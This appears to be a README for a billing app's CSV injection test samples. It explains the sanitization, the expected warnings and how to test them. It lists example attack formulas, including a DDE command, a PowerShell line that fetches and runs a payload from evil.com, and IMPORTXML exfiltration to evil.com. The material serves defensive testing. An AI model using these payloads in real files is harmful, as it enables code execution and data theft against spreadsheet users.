# CSV Injection Attack Sample Files

This directory contains sample CSV files demonstrating various CSV injection attack vectors and edge cases. These files are used for testing the OWASP-compliant sanitization implemented in the billing_templates package.

## ⚠️ Security Warning

**DO NOT** open these files in Microsoft Excel, LibreOffice Calc, or Google Sheets without understanding the security risks. These files contain malicious formulas designed to demonstrate CSV injection vulnerabilities.

## Sample Files

### 1. `sample_items_injection_attack.csv`
Demonstrates CSV injection attacks in item/product import context.

**Attack Vectors Included:**
- **Command Execution (DDE)**: `=cmd|'/c calc'!A1`
- **Phishing (HYPERLINK)**: `=HYPERLINK("http://evil.com";"Click")`
- **Formula Injection**: `@SUM`, `+formula`, `-formula`
- **Data Exfiltration**: `=IMPORTXML(CONCAT("http://evil.com/?v=";A2);"//root")`
- **PowerShell Payload**: `=cmd|'/c powershell IEX(wget http://evil.com/payload)'!A1`
- **Pipe Injection**: `|calc`
- **Tab Character Injection**: Leading tab character
- **Multi-line Injection**: Formulas with embedded newlines

**Safe Examples Included:**
- Normal product names
- Email addresses with `+` (safe: not at start)
- Phone numbers with `-` (safe: not at start)

### 2. `sample_parties_injection_attack.csv`
Demonstrates CSV injection attacks in party/contact import context.

**Attack Vectors Included:**
- Malicious business names with formulas
- Phone numbers with WEBSERVICE exfiltration
- Addresses containing formulas
- IMPORTXML data theft attempts
- Tab and pipe character injection
- Indirect reference injection

**Safe Examples Included:**
- Legitimate Indian GST numbers
- Valid PAN numbers
- Phone numbers with country codes
- Email addresses with special characters

### 3. `sample_items_edge_cases_security.csv`
Edge cases and boundary conditions for sanitization.

**Test Cases:**
- Single dangerous characters (`=`, `+`, `-`, `@`, `|`)
- Special characters in middle of strings (safe)
- Email addresses (safe)
- Unicode characters (Thai, Chinese, Spanish, etc.)
- Multi-line values
- Symbols and emojis
- Legitimate uses of special characters

## Expected Behavior

When these files are imported using the `SheetsImporterService` with default configuration (`sanitizeInput: true`):

### ✅ Sanitized Cells
All cells starting with dangerous characters will be prepended with a single quote `'`:
- `=malicious` → `'=malicious`
- `+attack` → `'+attack`
- `-formula` → `'-formula`
- `@SUM(1)` → `'@SUM(1)`
- `|calc` → `'|calc`

### ✅ Import Warnings
The import result will contain warnings of type `ImportWarningType.sanitizedFormulaInjection` for each sanitized cell:

```dart
ImportWarning(
  message: 'Sanitized potential CSV injection: "=malicious" → "\'=malicious"',
  rowIndex: 0,
  columnName: 'Item Name',
  type: ImportWarningType.sanitizedFormulaInjection,
)
```

### ✅ Safe Values Preserved
Values with special characters NOT at the start are preserved as-is:
- `user+tag@example.com` → unchanged (safe)
- `123-456-7890` → unchanged (safe)
- `Product = Good` → unchanged (safe)

## Usage in Tests

### Automated Testing
These files are referenced in `/test/security/csv_injection_test.dart` for integration testing:

```dart
final result = await service.importItems(
  fileBytes: await File('examples/sample_imports/sample_items_injection_attack.csv').readAsBytes(),
  fileName: 'sample_items_injection_attack.csv',
);

expect(result.data![0].name, equals("'=1+1+cmd|'/c calc'!A1"));
expect(result.warnings.any((w) => w.type == ImportWarningType.sanitizedFormulaInjection), true);
```

### Manual Testing
1. Run the Flutter app in Chrome: `flutter run -d chrome`
2. Navigate to the import screen
3. Select one of the sample attack files
4. Verify that:
   - Import succeeds
   - Dangerous formulas are neutralized with `'` prefix
   - Warnings are displayed to the user
   - Data can be safely exported to Excel/CSV later

## Opt-Out (Not Recommended)

To disable sanitization for trusted data sources:

```dart
final result = await service.importItems(
  fileBytes: fileBytes,
  fileName: 'trusted_source.csv',
  config: const ImportConfig(sanitizeInput: false),
);
```

**⚠️ Warning**: Only use `sanitizeInput: false` for data from completely trusted sources that you control. Disabling sanitization exposes your users to CSV injection attacks.

## References

- **OWASP CSV Injection**: https://owasp.org/www-community/attacks/CSV_Injection
- **CWE-1236**: https://cwe.mitre.org/data/definitions/1236.html
- **CSV Injection Talk (DEF CON)**: https://www.veracode.com/blog/secure-development/csv-injection-basic-write-exploit-and-protect
- **Google Security Blog**: https://security.googleblog.com/2017/10/building-more-secure-web-part-1.html

## Testing Checklist

- [ ] Import each sample file with default config
- [ ] Verify all dangerous formulas are sanitized
- [ ] Check that warnings are generated
- [ ] Confirm safe values are unchanged
- [ ] Export imported data to Excel and verify formulas don't execute
- [ ] Test with `sanitizeInput: false` and confirm formulas are preserved
- [ ] Run automated test suite: `flutter test test/security/csv_injection_test.dart`

## Security Contact

If you discover a new CSV injection vector not covered by these samples, please report it to the maintainers.
